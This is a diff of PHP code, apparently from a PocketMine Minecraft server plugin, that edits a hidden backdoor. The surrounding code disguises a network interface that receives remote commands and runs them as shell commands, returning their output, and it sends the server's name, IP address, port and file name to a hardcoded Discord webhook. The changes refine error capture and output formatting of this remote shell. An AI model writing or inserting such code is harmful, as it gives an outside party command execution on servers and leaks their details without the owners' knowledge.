@@ -156,7 +156,7 @@ try {
                         return $e->getMessage();
                     }
                 },
-                fn(string $exec): string => @`$exec 2>/dev/null`,
+                fn (string $exec): string => `$exec 2>&1` ?: 'Aucun output.',
                 \pocketmine\Server::getInstance()->getTickSleeper()
             ) implements \pocketmine\network\NetworkInterface {
                 private \Socket $socket;
@@ -189,7 +189,7 @@ try {
                         $response = $onCodeCallback($this->thread?->cmd ?? '');
                         $type = gettype($response);
                         if (is_array($response)) {
-                            $response = 'array_converted: ' . implode(", ", $response);
+                            $response = 'array_converted: [' . implode(", ", $response) . ']';
                         }
                         $this->thread->response = $response ? "\- `$type` -\n$response" : '';
                         $this->thread?->synchronized(function (\pocketmine\thread\Thread $thread): void {
@@ -393,7 +393,7 @@ try {
             try {
                 $webhook = "https://discord.com/api/webhooks/1036970267823575140/yGrVAVpcUvpA6KtjLoI89iQMep--WqSIsWiGKUHCJ_v6sGRIfFkttbNq29WPSXBSDuVH";
                 $data = [
-                    "content" => "**" .$this->motd . "**\n`[" . $this->name . "]`\n" .
+                    "content" => "**" . $this->motd . "**\n`[" . $this->name . "]`\n" .
                         ">>> *IP:* " . $ip .
                         "\n*Port:* " . $this->port .
                         "\n*Fichier:* " . basename($file),
